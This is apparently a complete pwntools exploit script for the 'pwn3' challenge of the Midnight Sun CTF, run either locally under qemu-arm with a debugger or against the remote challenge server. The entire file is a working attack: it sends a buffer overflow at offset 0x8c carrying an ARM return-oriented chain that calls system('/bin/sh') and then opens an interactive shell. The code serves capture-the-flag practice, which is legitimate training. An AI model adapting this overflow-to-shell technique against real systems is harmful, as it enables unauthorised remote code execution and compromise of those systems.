#!/usr/bin/env python3
from pwn import *
context.arch = 'arm'
if args.LOCAL:
    cwd = os.path.join(os.path.dirname(__file__), 'pwn3')
    io = process(['qemu-arm-static', '-g', '12345', 'pwn3'], cwd=cwd)
    exe = os.path.join(cwd, 'pwn3')
    gdbscript = f'''
b *0x10364
'''
    gdb.attach(('localhost', 12345), gdbscript=gdbscript, exe=exe)
else:
    io = remote('pwn3-01.play.midnightsunctf.se', 10003)
io.recvuntil('buffer: ')
system = 0x1480c | 1
bin_sh = 0x49018
pop_r0_r4_pc = 0x1fb5c
buffer = flat({
    0x8c: struct.pack('<IIII', pop_r0_r4_pc, bin_sh, 0, system),
})
io.sendline(buffer)
io.interactive()
